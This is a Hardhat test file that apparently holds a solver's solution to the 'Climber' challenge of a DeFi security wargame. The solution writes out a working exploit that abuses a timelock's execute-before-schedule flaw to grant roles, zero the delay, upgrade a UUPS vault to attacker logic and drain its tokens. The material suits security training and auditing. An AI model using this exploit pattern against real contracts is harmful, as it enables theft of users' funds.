const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */

	const hackVault = this.vault.connect(attacker);
	const hackTimeLock = this.timelock.connect(attacker);
	const hackToken = this.token.connect(attacker);

	const AttackTimeLockFactory = await ethers.getContractFactory("AttackClimberTimelock",attacker);
	const attackContract = await AttackTimeLockFactory.deploy(hackVault.address, hackTimeLock.address, hackToken.address, attacker.address);

	const AttackVaultFactory = await ethers.getContractFactory("AttackClimberVault",attacker);
	const attackVault = await AttackVaultFactory.deploy();

	const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));

	const myInterface = (signature, methodName, myArguments) => {
		const ABI = signature;
		const IFace = new ethers.utils.Interface(ABI);
		const ABIData = IFace.encodeFunctionData(methodName, myArguments);
		return ABIData;
	}

	// set attacker contract as proposer for timelock
	const setupRoleABI = ["function grantRole(bytes32 role, address account)"];
	const grantRoleData = myInterface(setupRoleABI, "grantRole", [PROPOSER_ROLE, attackContract.address]);
	// Update delay 
	const updateDelayABI = ["function updateDelay(uint64 newDelay)"];
	const updateDelayData = myInterface(updateDelayABI, "updateDelay", [0]);
	// Call to the vault to upgrade to attacker controlled contract logic
	const upgradeABI = ["function upgradeTo(address newImplementation)"];
	const upgradeData = myInterface(upgradeABI, "upgradeTo", [attackVault.address]);

	// Call attacking contract to schedule these actions and sweep funds
	const hackABI = ["function attack()"];
	const hackData = myInterface(hackABI, "attack", undefined);

	const toAddress = [hackTimeLock.address, hackTimeLock.address, hackVault.address, attackContract.address];
	const data = [grantRoleData, updateDelayData, upgradeData, hackData];
	// Set our 4 calls to attacking contract
	await attackContract.setScheduleData(toAddress, data);
	// Execute the 4 calls
	await hackTimeLock.execute(toAddress, Array(data.length).fill(0), data, ethers.utils.hexZeroPad("0x00",32));
	
	// Withdraw our funds from attacking contract that we sweeped before
	await attackContract.withdraw();

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
